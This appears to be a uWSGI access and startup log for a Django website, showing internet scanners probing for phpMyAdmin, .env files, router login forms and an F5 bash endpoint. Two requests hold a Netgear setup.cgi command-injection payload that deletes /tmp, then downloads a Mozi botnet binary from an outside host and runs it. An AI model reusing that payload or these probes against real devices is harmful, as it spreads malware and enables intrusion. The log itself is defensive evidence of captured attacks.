+[pid: 99601|app: 0|req: 36/44] 198.11.181.69 () {26 vars in 321 bytes} [Wed Jun  7 05:25:34 2023] GET /webdb/scripts/setup.php => generated 123376 bytes in 712 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 37/45] 198.11.181.69 () {26 vars in 323 bytes} [Wed Jun  7 05:25:34 2023] GET /websql/scripts/setup.php => generated 123376 bytes in 993 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 38/46] 198.11.181.69 () {26 vars in 333 bytes} [Wed Jun  7 05:25:36 2023] GET /_phpMyAdmin/scripts/setup.php => generated 123376 bytes in 592 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 39/47] 198.11.181.69 () {26 vars in 317 bytes} [Wed Jun  7 05:25:37 2023] GET /php/scripts/setup.php => generated 123376 bytes in 1018 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 40/48] 198.11.181.69 () {26 vars in 343 bytes} [Wed Jun  7 05:25:39 2023] GET /admin/phpmyadmin/scripts/setup.txt => generated 0 bytes in 6 msecs (HTTP/1.0 301) 3 headers in 141 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 5/49] 198.11.181.69 () {26 vars in 315 bytes} [Wed Jun  7 05:25:39 2023] GET /db/scripts/setup.php => generated 123376 bytes in 538 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 6/50] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:40 2023] GET /sqlmanager/scripts/setup.php => generated 123376 bytes in 1987 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 41/51] 198.11.181.69 () {26 vars in 335 bytes} [Wed Jun  7 05:25:42 2023] GET /mysqlmanager/scripts/setup.php => generated 123376 bytes in 855 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 42/52] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:44 2023] GET /phpmanager/scripts/setup.php => generated 123376 bytes in 840 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 43/53] 198.11.181.69 () {26 vars in 333 bytes} [Wed Jun  7 05:25:50 2023] GET /phpmy-admin/scripts/setup.php => generated 123376 bytes in 583 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 44/54] 198.11.181.69 () {26 vars in 333 bytes} [Wed Jun  7 05:25:50 2023] GET /mysql-admin/scripts/setup.php => generated 123376 bytes in 1007 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 46/55] 167.248.133.51 () {28 vars in 306 bytes} [Wed Jun  7 05:28:04 2023] GET / => generated 129706 bytes in 1098 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 46/56] 167.248.133.51 () {34 vars in 438 bytes} [Wed Jun  7 05:28:05 2023] GET / => generated 129706 bytes in 106408 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 7/57] 194.87.151.102 () {48 vars in 874 bytes} [Wed Jun  7 06:37:30 2023] POST /boaform/admin/formLogin => generated 0 bytes in 121893 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 48/58] 45.56.108.128 () {30 vars in 471 bytes} [Wed Jun  7 06:17:50 2023] GET /systembc/password.php => generated 725 bytes in 1302554 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 48/59] 83.97.73.89 () {36 vars in 542 bytes} [Wed Jun  7 06:09:27 2023] GET / => generated 725 bytes in 1806492 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 49/60] 2.57.122.71 () {36 vars in 520 bytes} [Wed Jun  7 06:46:35 2023] GET /.env => generated 123376 bytes in 339 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 5/61] 2.57.122.71 () {40 vars in 627 bytes} [Wed Jun  7 06:46:49 2023] POST / => generated 1382 bytes in 34 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 8/62] 31.220.1.83 () {34 vars in 435 bytes} [Wed Jun  7 07:26:28 2023] GET / => generated 129706 bytes in 24053 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 6/63] 59.2.114.132 () {30 vars in 430 bytes} [Wed Jun  7 07:45:52 2023] GET / => generated 129706 bytes in 28478 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 7/64] 87.236.176.190 () {36 vars in 477 bytes} [Wed Jun  7 07:49:19 2023] GET / => generated 129706 bytes in 32195 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 50/65] 162.243.135.14 () {34 vars in 421 bytes} [Wed Jun  7 08:09:24 2023] GET /druid/index.html => generated 725 bytes in 356512 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 9/66] 83.97.73.89 () {34 vars in 489 bytes} [Wed Jun  7 07:53:54 2023] GET / => generated 725 bytes in 1287355 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 8/67] 87.236.176.202 () {26 vars in 280 bytes} [Wed Jun  7 07:50:33 2023] OPTIONS / => generated 725 bytes in 1487573 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 1/68] 87.236.176.190 () {26 vars in 338 bytes} [Wed Jun  7 07:50:18 2023] GET /nice%20ports%2C/Tri%6Eity.txt%2ebak => generated 725 bytes in 1503432 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 9/69] 109.237.97.180 () {36 vars in 519 bytes} [Wed Jun  7 08:21:20 2023] GET /.env => generated 725 bytes in 1550 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 52/70] 152.32.185.236 () {32 vars in 488 bytes} [Wed Jun  7 08:35:09 2023] GET /robots.txt => generated 118 bytes in 1793 msecs (HTTP/1.1 200) 6 headers in 193 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 53/71] 152.32.185.236 () {32 vars in 490 bytes} [Wed Jun  7 08:34:52 2023] GET /favicon.ico => generated 725 bytes in 32515 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 10/72] 152.32.185.236 () {30 vars in 374 bytes} [Wed Jun  7 08:34:06 2023] GET / => generated 725 bytes in 77863 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 53/73] 152.32.185.236 () {32 vars in 490 bytes} [Wed Jun  7 08:35:13 2023] GET /sitemap.xml => generated 725 bytes in 23148 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 11/74] 83.97.73.89 () {34 vars in 507 bytes} [Wed Jun  7 08:36:48 2023] GET /geoserver => generated 0 bytes in 2088 msecs (HTTP/1.1 301) 3 headers in 116 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 11/75] 179.43.177.244 () {30 vars in 336 bytes} [Wed Jun  7 08:36:07 2023] GET / => generated 725 bytes in 44156 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 54/76] 83.97.73.89 () {36 vars in 559 bytes} [Wed Jun  7 08:36:51 2023] GET /geoserver/ => generated 725 bytes in 6643 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 56/77] 179.43.177.244 () {30 vars in 336 bytes} [Wed Jun  7 08:58:23 2023] GET / => generated 725 bytes in 816455 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 12/78] 184.105.247.196 () {34 vars in 449 bytes} [Wed Jun  7 08:57:04 2023] GET / => generated 725 bytes in 895316 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99599|app: 0|req: 2/79] 167.94.138.35 () {28 vars in 305 bytes} [Wed Jun  7 08:58:15 2023] GET / => generated 725 bytes in 824408 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 56/80] 198.46.154.138 () {36 vars in 519 bytes} [Wed Jun  7 08:59:04 2023] GET /.env => generated 725 bytes in 775080 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 12/81] 45.128.232.71 () {40 vars in 562 bytes} [Wed Jun  7 09:08:09 2023] GET / => generated 725 bytes in 230487 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 13/82] 54.36.115.221 () {40 vars in 625 bytes} [Wed Jun  7 09:12:57 2023] POST / => generated 1382 bytes in 12258 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 99599|app: 0|req: 3/83] 34.140.248.32 () {42 vars in 559 bytes} [Wed Jun  7 09:57:47 2023] GET / => generated 725 bytes in 4250 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 58/84] 45.156.129.12 () {34 vars in 482 bytes} [Wed Jun  7 10:01:34 2023] GET / => generated 725 bytes in 29094 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99599|app: 0|req: 4/85] 45.156.129.12 () {34 vars in 482 bytes} [Wed Jun  7 10:01:53 2023] GET / => generated 725 bytes in 15346 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 15/86] 45.156.129.12 () {34 vars in 494 bytes} [Wed Jun  7 10:02:47 2023] GET /admin/ => generated 0 bytes in 246554 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 15/87] 45.156.129.12 () {34 vars in 518 bytes} [Wed Jun  7 10:02:28 2023] GET /sugar_version.json => generated 725 bytes in 266223 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 59/88] 45.156.129.12 () {34 vars in 482 bytes} [Wed Jun  7 10:02:01 2023] GET / => generated 725 bytes in 293179 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 12/89] 82.31.81.23 () {28 vars in 300 bytes} [Wed Jun  7 10:03:29 2023] GET / => generated 725 bytes in 205173 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 59/90] 45.156.129.12 () {34 vars in 492 bytes} [Wed Jun  7 10:02:09 2023] GET /solr/ => generated 725 bytes in 285174 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 16/91] 141.98.11.41 () {28 vars in 304 bytes} [Wed Jun  7 10:09:51 2023] GET / => generated 725 bytes in 4293 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 60/92] 141.98.6.137 () {40 vars in 561 bytes} [Wed Jun  7 11:52:34 2023] GET / => generated 725 bytes in 798052 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 61/93] 35.216.229.26 () {32 vars in 359 bytes} [Wed Jun  7 12:30:05 2023] GET / => generated 725 bytes in 387893 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 62/94] 141.98.11.41 () {28 vars in 304 bytes} [Wed Jun  7 13:20:12 2023] GET / => generated 725 bytes in 44146 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 63/95] 60.188.219.121 () {26 vars in 593 bytes} [Wed Jun  7 13:21:56 2023] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.188.219.121:54708/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 725 bytes in 4457 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 13/96] 198.46.154.138 () {36 vars in 519 bytes} [Wed Jun  7 13:42:31 2023] GET /.env => generated 725 bytes in 1392957 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 64/97] 129.114.108.70 () {36 vars in 458 bytes} [Wed Jun  7 14:14:24 2023] GET /cdn-cgi/trace => generated 0 bytes in 1200 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 17/98] 51.79.29.48 () {40 vars in 623 bytes} [Wed Jun  7 15:24:19 2023] POST / => generated 1382 bytes in 253101 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 65/99] 185.11.61.58 () {30 vars in 369 bytes} [Wed Jun  7 15:36:23 2023] GET / => generated 725 bytes in 88953 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 14/100] 190.212.140.11 () {40 vars in 648 bytes} [Wed Jun  7 15:50:36 2023] POST /mgmt/tm/util/bash => generated 0 bytes in 5701 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 1)
+[pid: 99599|app: 0|req: 5/101] 190.212.140.11 () {32 vars in 351 bytes} [Wed Jun  7 15:50:41 2023] GET / => generated 725 bytes in 160008 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 18/102] 205.210.31.139 () {30 vars in 582 bytes} [Wed Jun  7 16:04:19 2023] GET / => generated 725 bytes in 498754 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 66/103] 185.11.61.58 () {30 vars in 369 bytes} [Wed Jun  7 16:06:43 2023] GET / => generated 725 bytes in 354047 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 67/104] 45.128.232.62 () {40 vars in 562 bytes} [Wed Jun  7 17:15:29 2023] GET / => generated 725 bytes in 959 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 68/105] 112.239.70.52 () {26 vars in 366 bytes} [Wed Jun  7 18:38:50 2023] GET /boaform/admin/formLogin?username=user&psd=user => generated 0 bytes in 96349 msecs (HTTP/1.0 301) 3 headers in 153 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 6/106] 205.210.31.12 () {30 vars in 581 bytes} [Wed Jun  7 19:00:31 2023] GET / => generated 725 bytes in 197897 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 70/107] 172.105.128.13 () {34 vars in 482 bytes} [Wed Jun  7 18:40:29 2023] GET / => generated 725 bytes in 1399608 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 70/108] 162.216.149.137 () {30 vars in 595 bytes} [Wed Jun  7 18:46:13 2023] GET / => generated 725 bytes in 1055789 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 71/109] 74.208.188.149 () {48 vars in 874 bytes} [Wed Jun  7 19:17:21 2023] POST /boaform/admin/formLogin => generated 0 bytes in 46 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 15/110] 94.102.61.10 () {34 vars in 481 bytes} [Wed Jun  7 19:09:08 2023] GET / => generated 725 bytes in 493311 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+-- unavailable modifier requested: 3 --
+-- unavailable modifier requested: 3 --
+-- unavailable modifier requested: 3 --
+[pid: 99601|app: 0|req: 72/114] 198.235.24.33 () {30 vars in 593 bytes} [Wed Jun  7 19:30:54 2023] GET / => generated 725 bytes in 12645 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 7/115] 152.32.135.231 () {38 vars in 610 bytes} [Wed Jun  7 19:53:00 2023] GET / => generated 725 bytes in 4724179 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 73/116] 141.98.11.41 () {28 vars in 304 bytes} [Wed Jun  7 20:18:40 2023] GET / => generated 725 bytes in 3184416 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 74/117] 13.85.73.210 () {26 vars in 336 bytes} [Wed Jun  7 21:17:29 2023] GET /nice%20ports%2C/Tri%6Eity.txt%2ebak => generated 725 bytes in 144295 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 19/118] 13.85.73.210 () {26 vars in 274 bytes} [Wed Jun  7 21:17:24 2023] GET / => generated 725 bytes in 154838 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99599|app: 0|req: 8/119] 13.85.73.210 () {26 vars in 278 bytes} [Wed Jun  7 21:17:26 2023] OPTIONS / => generated 725 bytes in 152945 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 75/120] 54.37.79.75 () {40 vars in 623 bytes} [Wed Jun  7 21:21:12 2023] POST / => generated 1382 bytes in 58859 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 76/121] 187.213.17.77 () {32 vars in 458 bytes} [Wed Jun  7 21:52:26 2023] GET / => generated 725 bytes in 292165 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 77/122] 162.216.150.55 () {30 vars in 594 bytes} [Wed Jun  7 22:06:55 2023] GET / => generated 725 bytes in 203060 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 16/123] 49.190.45.27 () {40 vars in 707 bytes} [Wed Jun  7 22:30:27 2023] GET /favicon.ico => generated 725 bytes in 103510 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 79/124] 49.190.45.27 () {40 vars in 753 bytes} [Wed Jun  7 22:30:47 2023] GET / => generated 725 bytes in 86141 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 21/125] 174.44.216.15 () {34 vars in 481 bytes} [Wed Jun  7 22:31:52 2023] GET / => generated 725 bytes in 313402 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 80/126] 49.190.45.27 () {40 vars in 707 bytes} [Wed Jun  7 22:31:49 2023] GET /favicon.ico => generated 725 bytes in 338198 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 18/127] 39.144.147.109 () {44 vars in 722 bytes} [Wed Jun  7 22:33:55 2023] GET / => generated 725 bytes in 230751 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 10/128] 180.163.29.206 () {36 vars in 656 bytes} [Wed Jun  7 22:34:07 2023] GET / => generated 725 bytes in 220200 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 80/131] 39.144.147.109 () {42 vars in 1001 bytes} [Wed Jun  7 22:33:07 2023] GET / => generated 725 bytes in 423701 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 10/131] 39.144.147.109 () {44 vars in 722 bytes} [Wed Jun  7 22:33:59 2023] GET / => generated 725 bytes in 371653 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 21/131] 39.144.147.109 () {42 vars in 1001 bytes} [Wed Jun  7 22:33:11 2023] GET / => generated 725 bytes in 419750 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 18/132] 39.144.147.109 () {42 vars in 691 bytes} [Wed Jun  7 22:33:50 2023] GET / => generated 725 bytes in 385798 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 81/133] 185.83.254.56 () {40 vars in 647 bytes} [Wed Jun  7 23:04:47 2023] POST /mgmt/tm/util/bash => generated 0 bytes in 98404 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 19/134] 45.155.204.17 () {48 vars in 873 bytes} [Wed Jun  7 23:19:32 2023] POST /boaform/admin/formLogin => generated 0 bytes in 158487 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+-- unavailable modifier requested: 3 --
+[pid: 99599|app: 0|req: 11/136] 185.83.254.56 () {32 vars in 350 bytes} [Wed Jun  7 23:04:53 2023] GET / => generated 725 bytes in 2040816 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99599|app: 0|req: 12/137] 194.180.48.85 () {48 vars in 873 bytes} [Thu Jun  8 00:18:51 2023] POST /boaform/admin/formLogin => generated 0 bytes in 509801 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+...brutally killing workers...
+Gracefully killing worker 1 (pid: 99598)...
+Gracefully killing worker 2 (pid: 99599)...
+Gracefully killing worker 3 (pid: 99600)...
+Gracefully killing worker 4 (pid: 99601)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (0.0.0.0:3031)
+running /home/wzr/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 00:27:22 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55de078bcec0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55de078bcec0 pid: 98535 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 98535)
+spawned uWSGI worker 1 (pid: 110347, cores: 2)
+spawned uWSGI worker 2 (pid: 110348, cores: 2)
+spawned uWSGI worker 3 (pid: 110349, cores: 2)
+spawned uWSGI worker 4 (pid: 110350, cores: 2)
+Thu Jun  8 00:28:51 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  8 00:28:51 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Thu Jun  8 04:33:31 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x5632f2bce8e0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5632f2bce8e0 pid: 1098 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1098)
+spawned uWSGI worker 1 (pid: 1099, cores: 2)
+spawned uWSGI worker 2 (pid: 1100, cores: 2)
+spawned uWSGI worker 3 (pid: 1101, cores: 2)
+spawned uWSGI worker 4 (pid: 1102, cores: 2)
+[pid: 1101|app: 0|req: 1/1] 219.78.235.164 () {42 vars in 831 bytes} [Thu Jun  8 00:33:43 2023] GET / => generated 129706 bytes in 751 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1101|app: 0|req: 2/2] 179.43.177.244 () {30 vars in 336 bytes} [Thu Jun  8 00:56:44 2023] GET / => generated 129706 bytes in 89 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 1/3] 45.128.232.62 () {40 vars in 562 bytes} [Thu Jun  8 01:28:58 2023] GET / => generated 129706 bytes in 643 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 2/4] 117.255.177.66 () {26 vars in 593 bytes} [Thu Jun  8 01:33:33 2023] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.255.177.66:43639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 123376 bytes in 105 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 3/5] 52.167.144.30 () {42 vars in 640 bytes} [Thu Jun  8 01:36:12 2023] GET / => generated 129706 bytes in 90 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 1102|app: 0|req: 4/6] 185.233.19.43 () {38 vars in 609 bytes} [Thu Jun  8 01:38:29 2023] GET / => generated 129706 bytes in 85 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 1102|app: 0|req: 5/7] 49.190.45.27 () {42 vars in 784 bytes} [Thu Jun  8 01:44:59 2023] GET / => generated 129706 bytes in 89 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
